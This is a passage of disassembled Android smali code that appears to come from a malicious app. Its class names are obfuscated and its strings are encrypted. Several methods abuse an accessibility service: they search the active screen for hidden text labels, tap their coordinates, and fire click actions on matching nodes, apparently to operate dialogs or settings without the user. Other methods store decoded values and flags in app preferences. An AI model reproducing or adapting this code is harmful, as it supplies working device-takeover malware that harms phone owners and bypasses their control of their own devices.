    const-wide/16 v2, 0x29a

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void
.end method

.method private static synthetic j2()V
    .locals 2

    .line 1
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/my;

    invoke-direct {v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/my;-><init>()V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method public static synthetic k()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->R1()V

    return-void
.end method

.method static synthetic k0()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->G1()V

    return-void
.end method

.method private static k1()V
    .locals 4

    .line 1
    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/py;

    invoke-direct {v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/py;-><init>()V

    const-wide/16 v2, 0x3e8

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void
.end method

.method private static synthetic k2()V
    .locals 2

    .line 1
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1e

    if-lt v0, v1, :cond_0

    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->W0()V

    :cond_0
    return-void
.end method

.method public static synthetic l(Landroid/content/Context;)V
    .locals 0

    .line 1
    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->D2(Landroid/content/Context;)V

    return-void
.end method

.method static synthetic l0(Landroid/view/accessibility/AccessibilityNodeInfo;)V
    .locals 0

    .line 1
    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->I0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    return-void
.end method

.method private static l1()V
    .locals 11

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v1, 0x1a

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v3, v2, [B

    fill-array-data v3, :array_1

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->d(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    const-wide/16 v3, 0x1f4

    const/4 v1, 0x0

    if-eqz v0, :cond_5

    invoke-interface {v0}, Ljava/util/List;->isEmpty()Z

    move-result v5

    if-nez v5, :cond_5

    invoke-interface {v0}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v5

    :goto_0
    invoke-interface {v5}, Ljava/util/Iterator;->hasNext()Z

    move-result v6

    if-eqz v6, :cond_1

    invoke-interface {v5}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v7

    if-eqz v7, :cond_0

    invoke-interface {v7}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v7

    sget-object v8, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->O:Ljava/lang/String;

    invoke-virtual {v7, v8}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v7

    if-eqz v7, :cond_0

    invoke-static {v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->obtain(Landroid/view/accessibility/AccessibilityNodeInfo;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v5

    if-eqz v5, :cond_2

    new-instance v7, Landroid/graphics/Rect;

    invoke-direct {v7}, Landroid/graphics/Rect;-><init>()V

    invoke-virtual {v6, v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    invoke-virtual {v7}, Landroid/graphics/Rect;->centerX()I

    move-result v6

    add-int/lit8 v6, v6, -0x32

    invoke-virtual {v7}, Landroid/graphics/Rect;->centerY()I

    move-result v7

    invoke-static {v6, v7}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->z(II)Z

    invoke-virtual {v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    new-instance v6, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v7

    invoke-direct {v6, v7}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v7, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/qz;

    invoke-direct {v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/qz;-><init>()V

    invoke-virtual {v6, v7, v3, v4}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    goto :goto_1

    :cond_0
    invoke-virtual {v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    goto :goto_0

    :cond_1
    move-object v5, v1

    :cond_2
    :goto_1
    invoke-interface {v0}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v6

    :cond_3
    :goto_2
    invoke-interface {v6}, Ljava/util/Iterator;->hasNext()Z

    move-result v7

    if-eqz v7, :cond_5

    invoke-interface {v6}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-eqz v5, :cond_4

    if-eq v7, v5, :cond_3

    :cond_4
    invoke-virtual {v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    goto :goto_2

    :cond_5
    if-nez v0, :cond_11

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v5, 0x2c

    new-array v5, v5, [B

    fill-array-data v5, :array_2

    new-array v2, v2, [B

    fill-array-data v2, :array_3

    invoke-static {v5, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_11

    new-instance v2, Ljava/util/ArrayList;

    invoke-direct {v2}, Ljava/util/ArrayList;-><init>()V

    sget-object v5, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->O:Ljava/lang/String;

    invoke-static {v0, v5, v2}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->e1(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;Ljava/util/List;)V

    invoke-interface {v2}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v2

    const/high16 v5, -0x80000000

    move-object v6, v1

    move-object v7, v6

    :goto_3
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    move-result v8

    if-eqz v8, :cond_b

    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v8, :cond_6

    goto :goto_3

    :cond_6
    new-instance v9, Landroid/graphics/Rect;

    invoke-direct {v9}, Landroid/graphics/Rect;-><init>()V

    invoke-virtual {v8, v9}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    iget v9, v9, Landroid/graphics/Rect;->left:I

    if-le v9, v5, :cond_8

    if-eqz v7, :cond_7

    invoke-virtual {v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    :cond_7
    invoke-static {v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->obtain(Landroid/view/accessibility/AccessibilityNodeInfo;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v5

    move-object v7, v5

    move v5, v9

    :cond_8
    invoke-virtual {v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v9

    if-eqz v9, :cond_a

    invoke-interface {v9}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v9

    sget-object v10, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->O:Ljava/lang/String;

    invoke-virtual {v9, v10}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v9

    if-eqz v9, :cond_a

    if-eqz v6, :cond_9

    invoke-virtual {v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    :cond_9
    invoke-static {v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->obtain(Landroid/view/accessibility/AccessibilityNodeInfo;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v6

    :cond_a
    invoke-virtual {v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    goto :goto_3

    :cond_b
    if-eqz v6, :cond_c

    if-eqz v7, :cond_c

    new-instance v1, Landroid/graphics/Rect;

    invoke-direct {v1}, Landroid/graphics/Rect;-><init>()V

    new-instance v2, Landroid/graphics/Rect;

    invoke-direct {v2}, Landroid/graphics/Rect;-><init>()V

    invoke-virtual {v6, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    invoke-virtual {v7, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    iget v1, v1, Landroid/graphics/Rect;->left:I

    iget v2, v2, Landroid/graphics/Rect;->left:I

    if-ge v1, v2, :cond_d

    goto :goto_4

    :cond_c
    if-eqz v6, :cond_e

    :cond_d
    move-object v1, v6

    goto :goto_5

    :cond_e
    if-eqz v7, :cond_f

    :goto_4
    move-object v1, v7

    :cond_f
    :goto_5
    if-eqz v1, :cond_10

    new-instance v2, Landroid/graphics/Rect;

    invoke-direct {v2}, Landroid/graphics/Rect;-><init>()V

    invoke-virtual {v1, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    invoke-virtual {v2}, Landroid/graphics/Rect;->centerX()I

    move-result v5

    add-int/lit8 v5, v5, -0x32

    invoke-virtual {v2}, Landroid/graphics/Rect;->centerY()I

    move-result v2

    invoke-static {v5, v2}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->z(II)Z

    new-instance v2, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v5

    invoke-direct {v2, v5}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v5, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/rz;

    invoke-direct {v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/rz;-><init>()V

    invoke-virtual {v2, v5, v3, v4}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    :cond_10
    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    :cond_11
    return-void

    :array_0
    .array-data 1
        -0x57t
        -0x26t
        0x65t
        0x48t
        0x47t
        -0x24t
        0x26t
        -0xdt
        -0x5at
        -0x2ct
        0x7dt
        0x8t
        0x46t
        -0x2at
        0x28t
        -0x51t
        -0x8t
        -0x71t
        0x61t
        0x2t
        0xat
        -0x2et
        0x2ct
        -0x41t
        -0x51t
        -0x27t
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x36t
        -0x4bt
        0x8t
        0x66t
        0x25t
        -0x42t
        0x4dt
        -0x23t
    .end array-data

    :array_2
    .array-data 1
        -0x29t
        -0x17t
        -0x38t
        -0x51t
        0x23t
        -0x58t
        -0x4dt
        0x3et
        -0x28t
        -0x19t
        -0x30t
        -0x11t
        0x22t
        -0x5et
        -0x43t
        0x62t
        -0x7at
        -0x44t
        -0x34t
        -0x1bt
        0x6et
        -0x5at
        -0x47t
        0x65t
        -0x26t
        -0x1bt
        -0x33t
        -0x1ct
        0x33t
        -0x6bt
        -0x45t
        0x7ft
        -0x26t
        -0xet
        -0x3ct
        -0x18t
        0x2ft
        -0x51t
        -0x56t
        0x4ft
        -0x3et
        -0x11t
        -0x40t
        -0xat
    .end array-data

    :array_3
    .array-data 1
        -0x4ct
        -0x7at
        -0x5bt
        -0x7ft
        0x41t
        -0x36t
        -0x28t
        0x10t
    .end array-data
.end method

.method private static synthetic l2(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 1

    .line 1
    sget-object v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->M:Ljava/lang/String;

    invoke-static {p0, v0, p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    sget-object p1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->N:Ljava/lang/String;

    invoke-static {p0, p1, p2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    sget-object p1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->O:Ljava/lang/String;

    invoke-static {p0, p1, p3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    sget-object p1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->P:Ljava/lang/String;

    invoke-static {p0, p1, p4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    const/16 p1, 0xa

    new-array p1, p1, [B

    fill-array-data p1, :array_0

    const/16 p2, 0x8

    new-array p3, p2, [B

    fill-array-data p3, :array_1

    invoke-static {p1, p3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    sget-object p3, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    invoke-static {p0, p1, p3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    new-array p1, p2, [B

    fill-array-data p1, :array_2

    new-array p2, p2, [B

    fill-array-data p2, :array_3

    invoke-static {p1, p2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-static {p0, p1, p3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    return-void

    nop

    :array_0
    .array-data 1
        -0x6dt
        0x37t
        -0x20t
        0x1ft
        -0x11t
        0x40t
        0x44t
        0xat
        -0x74t
        0x38t
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x1dt
        0x56t
        -0x6dt
        0x6ct
        -0x68t
        0x2ft
        0x36t
        0x6et
    .end array-data

    :array_2
    .array-data 1
        0x7ft
        -0x55t
        -0x21t
        -0x10t
        -0x4et
        -0x7et
        -0x40t
        0x58t
    .end array-data

    :array_3
    .array-data 1
        0x12t
        -0x3ct
        -0x45t
        -0x6bt
        -0x2at
        -0x15t
        -0x5ft
        0x37t
    .end array-data
.end method

.method public static synthetic m(Landroid/content/Context;)V
    .locals 0

    .line 1
    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->r2(Landroid/content/Context;)V

    return-void
.end method

.method static synthetic m0()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->y0()V

    return-void
.end method

.method private static m1()V
    .locals 22

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_2

    const/4 v1, 0x6

    new-array v2, v1, [B

    fill-array-data v2, :array_0

    const/16 v3, 0x8

    new-array v4, v3, [B

    fill-array-data v4, :array_1

    invoke-static {v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v5

    new-array v2, v1, [B

    fill-array-data v2, :array_2

    new-array v4, v3, [B

    fill-array-data v4, :array_3

    invoke-static {v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    new-array v2, v3, [B

    fill-array-data v2, :array_4

    new-array v4, v3, [B

    fill-array-data v4, :array_5

    invoke-static {v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v7

    const/16 v2, 0x12

    new-array v2, v2, [B

    fill-array-data v2, :array_6

    new-array v4, v3, [B

    fill-array-data v4, :array_7

    invoke-static {v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v8

    const/4 v2, 0x7

    new-array v2, v2, [B

    fill-array-data v2, :array_8

    new-array v4, v3, [B

    fill-array-data v4, :array_9

    invoke-static {v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v9

    const/16 v2, 0xe

    new-array v2, v2, [B

    fill-array-data v2, :array_a

    new-array v4, v3, [B

    fill-array-data v4, :array_b

    invoke-static {v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v10

    const/16 v2, 0xa

    new-array v2, v2, [B

    fill-array-data v2, :array_c

    new-array v4, v3, [B

    fill-array-data v4, :array_d

    invoke-static {v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v11

    const/16 v2, 0xb

    new-array v4, v2, [B

    fill-array-data v4, :array_e

    new-array v12, v3, [B

    fill-array-data v12, :array_f

    invoke-static {v4, v12}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v12

    new-array v4, v2, [B

    fill-array-data v4, :array_10

    new-array v13, v3, [B

    fill-array-data v13, :array_11

    invoke-static {v4, v13}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v13

    new-array v4, v1, [B

    fill-array-data v4, :array_12

    new-array v14, v3, [B

    fill-array-data v14, :array_13

    invoke-static {v4, v14}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v14

    new-array v2, v2, [B

    fill-array-data v2, :array_14

    new-array v4, v3, [B

    fill-array-data v4, :array_15

    invoke-static {v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v15

    new-array v2, v3, [B

    fill-array-data v2, :array_16

    new-array v4, v3, [B

    fill-array-data v4, :array_17

    invoke-static {v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v16

    const/4 v2, 0x5

    new-array v2, v2, [B

    fill-array-data v2, :array_18

    new-array v4, v3, [B

    fill-array-data v4, :array_19

    invoke-static {v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v17

    const/16 v2, 0x14

    new-array v2, v2, [B

    fill-array-data v2, :array_1a

    new-array v4, v3, [B

    fill-array-data v4, :array_1b

    invoke-static {v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v18

    new-array v1, v1, [B

    fill-array-data v1, :array_1c

    new-array v2, v3, [B

    fill-array-data v2, :array_1d

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v19

    const/16 v1, 0x15

    new-array v1, v1, [B

    fill-array-data v1, :array_1e

    new-array v2, v3, [B

    fill-array-data v2, :array_1f

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v20

    const/16 v1, 0x19

    new-array v1, v1, [B

    fill-array-data v1, :array_20

    new-array v2, v3, [B

    fill-array-data v2, :array_21

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v21

    filled-new-array/range {v5 .. v21}, [Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x0

    :goto_0
    const/16 v3, 0x11

    if-ge v2, v3, :cond_2

    aget-object v3, v1, v2

    invoke-virtual {v0, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v4

    if-eqz v4, :cond_1

    invoke-interface {v4}, Ljava/util/List;->isEmpty()Z

    move-result v5

    if-nez v5, :cond_1

    invoke-interface {v4}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v4

    :cond_0
    :goto_1
    invoke-interface {v4}, Ljava/util/Iterator;->hasNext()Z

    move-result v5

    if-eqz v5, :cond_1

    invoke-interface {v4}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v6

    if-eqz v6, :cond_0

    invoke-virtual {v3, v6}, Ljava/lang/String;->contentEquals(Ljava/lang/CharSequence;)Z

    move-result v6

    if-eqz v6, :cond_0

    invoke-static {v5}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g1(Landroid/view/accessibility/AccessibilityNodeInfo;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v5

    if-eqz v5, :cond_0

    const/16 v6, 0x10

    invoke-virtual {v5, v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    goto :goto_1

    :cond_1
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    :cond_2
    return-void

    :array_0
    .array-data 1
        -0x2ct
        -0x66t
        0x25t
        -0x20t
        0x3t
        -0x3dt
    .end array-data

    nop

    :array_1
    .array-data 1
        0x3dt
        0xet
        -0x5ct
        0x5t
        -0x53t
        0x59t
        -0x7bt
        0x79t
    .end array-data

    :array_2
    .array-data 1
        -0x26t
        0x64t
        -0x5ft
        0x10t
        -0x3at
        0x64t
    .end array-data

    nop

    :array_3
    .array-data 1
        0x33t
        -0x16t
        0x37t
        -0xbt
        0x68t
        -0x2t
        -0x5dt
        -0x25t
    .end array-data

    :array_4
    .array-data 1
        0x1et
        -0x1ct
        0x27t
        -0x3bt
        -0x77t
        -0x3at
        0x3dt
        0x26t
    .end array-data

    :array_5
    .array-data 1
        0x52t
        -0x75t
        0x44t
        -0x52t
        -0x13t
        -0x57t
        0x4at
        0x48t
    .end array-data

    :array_6
    .array-data 1
        -0x6ct
        -0x3t
        0x30t
        0xbt
        0xdt
        -0x6dt
        0x51t
        0x79t
        -0x28t
        -0x63t
        0x1et
        0x68t
        0x6dt
        -0x6et
        0x14t
        0x18t
        -0xct
        -0x33t
    .end array-data

    nop

    :array_7
    .array-data 1
        0x77t
        0x7et
        -0x63t
        -0x18t
        -0x72t
        0x10t
        -0x4et
        -0x5t
    .end array-data

    :array_8
    .array-data 1
        0x37t
        0x52t
        0x70t
        -0x45t
        -0x5at
        -0x2at
        0x43t
    .end array-data

    :array_9
